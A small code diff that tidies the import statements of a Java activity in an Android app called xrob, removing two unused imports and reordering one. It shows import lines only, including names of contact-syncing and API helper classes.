@@ -1,22 +1,20 @@
 package com.theah64.xrob;
 
 import android.Manifest;
-import android.app.LauncherActivity;
 import android.content.ComponentName;
 import android.content.DialogInterface;
 import android.content.Intent;
 import android.content.pm.PackageManager;
 import android.os.Build;
+import android.os.Bundle;
 import android.support.annotation.NonNull;
 import android.support.v7.app.AppCompatActivity;
-import android.os.Bundle;
 import android.util.Log;
 import android.view.View;
 import android.widget.EditText;
 import android.widget.Toast;
 
 import com.theah64.xrob.asynctasks.ContactRefresher;
-import com.theah64.xrob.interfaces.JobListener;
 import com.theah64.xrob.services.ContactsWatcherService;
 import com.theah64.xrob.utils.APIRequestBuilder;
 import com.theah64.xrob.utils.APIRequestGateway;
